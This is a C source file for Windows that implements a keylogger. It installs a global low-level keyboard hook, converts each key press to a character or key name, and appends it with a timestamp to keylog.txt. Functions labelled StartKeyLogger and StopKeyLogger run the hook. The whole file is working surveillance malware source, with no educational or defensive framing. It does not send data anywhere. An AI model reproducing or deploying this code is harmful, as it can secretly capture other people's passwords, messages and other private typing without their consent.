#include "hooks.h"
#include <stdio.h>
#include <time.h>
#include <windows.h>

static HHOOK hHook;
static FILE *logFile;
static int shiftPressed = 0;

char getCharFromVK(DWORD vkCode) {
    BYTE keyboardState[256];
    GetKeyboardState(keyboardState);

    UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
    WCHAR buffer[5];
    int result = ToUnicode(vkCode, scanCode, keyboardState, buffer, 4, 0);

    if (result == 1) {
        return (char)buffer[0];
    }
    return 0;
}

char* getTimestamp() {
    static char timeStr[64];
    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    strftime(timeStr, sizeof(timeStr), "[%Y-%m-%d %H:%M:%S]", t);
    return timeStr;
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
        DWORD vkCode = kbd->vkCode;

        logFile = fopen("keylog.txt", "a+");
        if (logFile) {
            char ch = getCharFromVK(vkCode);

            fprintf(logFile, "%s ", getTimestamp());

            if (ch) {
                fprintf(logFile, "%c\n", ch);
            } else {
                char keyName[32];
                UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
                GetKeyNameText(scanCode << 16, keyName, sizeof(keyName));
                fprintf(logFile, "[%s]\n", keyName);
            }

            fclose(logFile);
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

void StartKeyLogger() {
    MSG msg;
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!hHook) {
        printf("Failed to install hook!\n");
        return;
    }
    printf("Keylogger started. Logging to keylog.txt\n");
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}

void StopKeyLogger() {
    UnhookWindowsHookEx(hHook);
}
